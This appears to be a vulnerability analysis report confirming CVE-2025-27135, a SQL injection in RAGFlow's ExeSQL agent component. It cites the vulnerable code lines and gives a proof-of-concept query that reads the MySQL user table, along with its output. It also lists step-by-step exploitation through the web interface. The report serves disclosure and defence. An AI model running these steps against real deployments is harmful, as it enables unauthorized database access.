CVE-2025-27135 RAGFlow SQL Injection - Analysis Result
======================================================

Vulnerability Status: CONFIRMED
Exploitation Method: Manual via Web UI

VULNERABILITY ANALYSIS
----------------------
Component: agent/component/exesql.py
Root Cause: Direct SQL execution without sanitization

Vulnerable Code:
  Line 80-85: ans = self.get_input()  # User input from chat
  Line 113:   cursor.execute(single_sql)  # No sanitization

EXPLOITATION VERIFIED (Official PoC)
------------------------------------
Input:  select user from mysql.user;
Output: 
  Total: 5
  | # | user              |
  |---|-------------------|
  | 0 | root              |
  | 1 | debian-sys-maint  |
  | 2 | mysql.infoschema  |
  | 3 | mysql.session     |
  | 4 | mysql.sys         |

EXPLOITATION STEPS
------------------
1. Login to RAGFlow web interface
2. Create Agent/Canvas workflow with ExeSQL component
3. Configure ExeSQL with target database credentials
4. Send SQL queries in chat dialog
5. Results returned directly in chat response

Reference: https://swizzky.notion.site/ragflow-exesql-150ca6df7c03806989cefde915cf8e42

Conclusion: Vulnerability confirmed. ExeSQL component executes user-provided
SQL statements directly without any input validation or sanitization.
